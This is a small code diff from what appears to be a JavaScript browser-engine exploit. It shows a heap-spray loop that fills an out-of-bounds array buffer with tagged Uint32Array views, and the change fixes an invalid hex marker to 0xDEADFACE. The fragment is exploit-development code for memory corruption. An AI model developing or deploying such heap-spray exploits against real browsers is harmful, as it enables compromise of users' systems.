@@ -68,7 +68,7 @@ export async function sprayAndInvestigateObjectExposure() {
             }
             try {
                 let view = new Uint32Array(oob_array_buffer_real, current_data_offset_for_view, SPRAY_VIEW_ELEMENT_COUNT);
-                view[0] = (0xVIEWFACE | i);
+                view[0] = (0xDEADFACE  | i);
                 sprayedVictimViews.push(view); // Esta é a linha ~71 pela contagem
                 current_data_offset_for_view += SPRAY_VIEW_BYTE_OFFSET_INCREMENT;
             } catch (e_spray) {
